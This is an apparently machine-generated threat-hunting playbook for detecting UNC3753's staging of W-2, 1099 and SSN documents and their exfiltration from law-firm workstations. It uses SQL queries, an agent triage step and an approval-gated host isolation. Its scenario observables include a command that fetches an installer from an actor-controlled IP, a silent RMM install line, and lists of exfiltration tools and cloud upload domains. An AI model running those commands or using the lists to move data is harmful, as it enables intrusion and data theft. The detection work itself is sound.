---
analysis: A simple rule for 'WinSCP' generates noise. This hunt correlates software
  inventory (scoping to legal apps), sensitive keyword file writes in user profile
  paths, and outbound HTTP/FTP traffic in a tight temporal window, a context that
  requires analyst or agent weight to avoid false positives.
blind_spots:
- id: no-http-proxy-visibility
  question: Which specific files were uploaded to Google Drive?
  requires: hb_http_activity with decrypted SSL inspection
  risk: If SSL inspection is not active, the hunt can see the domain and method (POST)
    but not the actual filenames being exfiltrated.
  stage: exfiltration-cloud-ftp
- id: imanage-application-logs
  question: What internal keywords were used in the document management search?
  requires: iManage audit logs
  risk: We can only see the outcome (files appearing in Downloads), not the search
    activity that preceded it inside the legal app.
  stage: discovery-document-harvesting
- id: usb-physical-access
  question: Was data exfiltrated via physical USB media?
  requires: hb_device_event (removable storage logs)
  risk: Physical intrusions noted in the article cannot be tracked with current process/network
    telemetry alone.
coverage:
- stage: discovery-document-harvesting
  status: covered
  steps:
  - sensitive-file-staging
- stage: exfiltration-cloud-ftp
  status: covered
  steps:
  - exfil-tool-execution
  - cloud-storage-uploads
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: initial-access-vishing-pretext
  status: out_of_scope
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: execution-rmm-abuse
  status: out_of_scope
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: lateral-movement-vdi-pivot
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: UNC3753 targets sensitive legal PII for immediate extortion. Detecting
    the staging phase is the last opportunity to stop the breach before the data leaves
    the environment and the organization loses all leverage.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder has identified sensitive legal or financial documents via
  iManage or similar repositories and is staging them in user-writable profile paths
  for exfiltration via portable transfer tools or web-based uploads.
labels:
- hunt
- attack.t1041
- attack.t1567.002
- attack.t1083
name: Sensitive Document Staging and Exfiltration
parameters:
  cloud_storage_domains:
    default:
    - drive.google.com
    - docs.google.com
    - dropbox.com
    - mega.nz
    - wetransfer.com
    description: Consumer cloud storage domains used for exfiltration.
    from:
      kind: article
      observed: '2026-09-09'
      ref: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
    type: list[domain]
  exfil_tools:
    default:
    - winscp.exe
    - rclone.exe
    - pscp.exe
    - filezilla.exe
    description: Known transfer utilities often deployed in portable form.
    from:
      kind: article
      observed: '2026-05-01'
      ref: UNC3753 Targeted Campaign
    type: list[string]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
  scope_hosts:
    default: []
    description: Optional list of hostnames to focus on (e.g. from the scoping step).
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus on workstations belonging to finance, tax, and legal departments.
  These are the users most likely to have access to the target documents (W-2, 1099,
  client agreements).
references:
- name: UNC3753 targeted campaign against US law firms
  url: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
related:
- hunt: unc3753-vishing-and-rmm-abuse
  reason: Initial access and RMM installation typically happen hours before the staging
    and exfiltration covered here.
  relation: precedes
- hunt: unc3753-vishing-vdi-bridge
  relation: follows
scenario:
  stages:
  - name: Vishing and Helpdesk Impersonation
    observables:
    - Invoice-themed emails from consumer accounts
    - Phone calls posing as IT support/security
    - Instructions to join screen-sharing sessions
    slug: initial-access-vishing-pretext
    tactic: initial-access
    techniques:
    - T1566
  - name: Abuse of RMM and Screen-Sharing Tools
    observables:
    - privnote.com
    - SuperOps.msi
    - curl -sL http://[actor-controlled-ip]/installer
    - msiexec /i SuperOps.msi /quiet
    - AnyDesk
    - Bomgar
    - Zoho Assist
    - Quick Assist
    slug: execution-rmm-abuse
    tactic: execution
    techniques:
    - T1133
    - T1090.003
  - name: BYOD to VDI Environment Pivot
    observables:
    - Windows365.exe
    - Citrix clients
    - Logins from personal BYOD source IPs
    slug: lateral-movement-vdi-pivot
    tactic: lateral-movement
    techniques:
    - T1021.001
  - name: Document Staging and Keyword Discovery
    observables:
    - iManage keyword searches
    - Searching for W-2, W-9, 1099, SSN
    - Staging files in Downloads folder
    - Staging files in Roaming profile path
    slug: discovery-document-harvesting
    tactic: discovery
  - name: Exfiltration via WinSCP and Cloud Storage
    observables:
    - WinSCP.exe
    - rclone.exe
    - Drag-and-drop to consumer Google Drive
    - Email forwarding to actor email addresses
    - Exfiltration within 30 minutes of entry
    slug: exfiltration-cloud-ftp
    tactic: exfiltration
    techniques:
    - T1041
    - T1567.002
  summary: UNC3753 conducts fast-tempo data theft extortion campaigns against law
    firms by using vishing and social engineering to trick employees into installing
    RMM tools. Once access is established, the actors pivot through VDI environments
    to harvest sensitive legal and financial documents for exfiltration via FTP utilities
    or cloud storage.
series:
  index: 2
  slug: unc3753-targeted-campaign-against-us-law-firms
  title: UNC3753 targeted campaign against US law firms
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  web:
    category: siem
    name: Web server / proxy logs
    telemetry:
    - network
tlp: clear
type: investigation
---


# Sensitive Document Staging and Exfiltration

UNC3753 (Luna Moth) specifically targets US law firms for extortion, moving from initial access to data theft in under a day. This hunt identifies the 'staging' phase—where files containing PII (SSN, W-2, 1099) are consolidated in local user folders—and the subsequent use of portable WinSCP/Rclone binaries or browser-based uploads to move data to actor-controlled cloud storage. It combines software inventory scoping with file and process behavioral analytics to distinguish rare adversary staging from normal user activity.

## imanage-host-inventory
<!-- Inventory of hosts with document management software -->
Identify hosts running iManage or WorkSite software, which are primary targets for this campaign's harvesting phase.

```sqlite target=endpoint role=scoping
~~~yaml
expected: A list of hosts likely containing the firm's sensitive legal repositories;
  silence means the document management system is either not local or uses a different
  package name.
reads:
- device_hostname
- package_name
- package_version
- vendor_name
silence: not_evidence_of_absence
source: hb_software_inventory
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, package_name, package_version FROM hb_software_inventory WHERE (LOWER(package_name) LIKE '%imanage%' OR LOWER(package_name) LIKE '%worksite%') OR (LOWER(vendor_name) LIKE '%imanage%')
```

## gather-behavior-and-exfil
<!-- Gather staging and exfiltration evidence -->
parallel:
- → sensitive-file-staging
- → exfil-tool-execution
- → cloud-storage-uploads
join: → triage-agent

## sensitive-file-staging
<!-- Creation of sensitive documents in user-writable paths -->
Find instances where files containing financial keywords (W-2, 1099, SSN) are written to profile paths like Downloads or Roaming AppData, accounting for cross-OS path styles.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: Creation of ZIP, PDF, or XLSX files with sensitive identifiers in paths
  typically used by actors for staging.
reads:
- device_hostname
- file_name
- file_path
- actor_user_name
- time
silence: not_evidence_of_absence
source: hb_file_activity
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, file_name, file_path, actor_user_name, time FROM hb_file_activity WHERE (LOWER(file_path) LIKE '%/downloads/%' OR LOWER(file_path) LIKE '%\\downloads\\%' OR LOWER(file_path) LIKE '%/appdata/roaming/%' OR LOWER(file_path) LIKE '%\\appdata\\roaming\\%') AND (LOWER(file_name) LIKE '%w-2%' OR LOWER(file_name) LIKE '%1099%' OR LOWER(file_name) LIKE '%ssn%' OR LOWER(file_name) LIKE '%tax%' OR LOWER(file_name) LIKE '%audit%') AND time >= datetime('now', '-{{lookback_days}} days') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0)
```

## exfil-tool-execution
<!-- Execution of rare transfer tools from profile paths -->
Identify execution of transfer utilities by their basename or original filename, especially when running from user-writable paths.

```sqlite target=endpoint role=baseline params=(exfil_tools=exfil_tools, lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: A portable utility like WinSCP running on a single host; legitimate admin
  versions of these tools typically appear across many hosts. GROUP BY on process_name
  ensures the count reflects the tool's basename prevalence.
prevalence:
  by: device_hostname
  key:
  - process_name
  rare_below: 3
reads:
- process_name
- process_original_file_name
- process_cmd_line
- device_hostname
- process_path
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT process_name, process_original_file_name, process_cmd_line, device_hostname, COUNT(DISTINCT device_hostname) as host_count, MIN(time) as first_seen FROM hb_process_activity WHERE (instr(',' || '{{exfil_tools}}' || ',', ',' || LOWER(process_name) || ',') > 0 OR instr(',' || '{{exfil_tools}}' || ',', ',' || LOWER(process_original_file_name) || ',') > 0 OR (LOWER(process_path) LIKE '%/downloads/%' OR LOWER(process_path) LIKE '%\\downloads\\%' OR LOWER(process_path) LIKE '%/users/public/%' OR LOWER(process_path) LIKE '%\\users\\public\\%')) AND time >= datetime('now', '-{{lookback_days}} days') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) GROUP BY process_name HAVING host_count <= 3
```

## cloud-storage-uploads
<!-- HTTP uploads to consumer cloud storage -->
Monitor for POST/PUT requests to known exfiltration destinations, especially from hosts where sensitive files were recently staged.

```sqlite target=web role=enrichment params=(cloud_storage_domains=cloud_storage_domains, lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: Active uploads to Drive or Dropbox; silence is expected as most corporate
  environments use managed tenants, not consumer endpoints.
reads:
- device_hostname
- url_hostname
- url_path
- http_method
- time
silence: not_evidence_of_absence
source: hb_http_activity
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, url_hostname, url_path, http_method, time FROM hb_http_activity WHERE instr(',' || '{{cloud_storage_domains}}' || ',', ',' || LOWER(url_hostname) || ',') > 0 AND http_method IN ('POST', 'PUT') AND time >= datetime('now', '-{{lookback_days}} days') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0)
```

## triage-agent
<!-- Weigh staging and exfiltration activity -->
```agent target=hunter
cite: required
context:
- sensitive-file-staging
- exfil-tool-execution
- cloud-storage-uploads
max_iterations: 4
objective: Determine if a host has undergone document harvesting followed by exfiltration
  by checking for temporal correlation between the parallel query results.
success_criteria: A verdict of malicious if staging and exfiltration tools coincide
  on one host.
tools:
- endpoint
- web
```

## verdict-decision
<!-- Route on evidence of exfiltration -->
if~: "the triage verdict identifies both staging (sensitive file creation) and exfiltration (tool execution or cloud upload) for a specific host" (confidence: high, judge=hunter)
then: → isolate-compromised-host
indeterminate: → analyst-remediation-task
unavailable: → analyst-remediation-task (blind_spot: no-http-proxy-visibility)
else: → close-out

## isolate-compromised-host
<!-- Isolate host for IR -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host immediately. Do not shut it down to preserve memory. Collect the Downloads folder and recently modified profile paths for forensic analysis.
```
→ analyst-remediation-task

## analyst-remediation-task
<!-- Forensic review and remediation -->
```manual target=analyst
Review the staged files. Determine if the exfiltration tools established persistent C2. Check for the Zoom/Teams sessions that may have preceded this staging as noted in Hunt 1.
```
→ end

## close-out
<!-- Close out hunt -->
```manual target=analyst
Summarize the hosts scanned and confirm no evidence of high-volume sensitive document staging was observed.
```
→ end
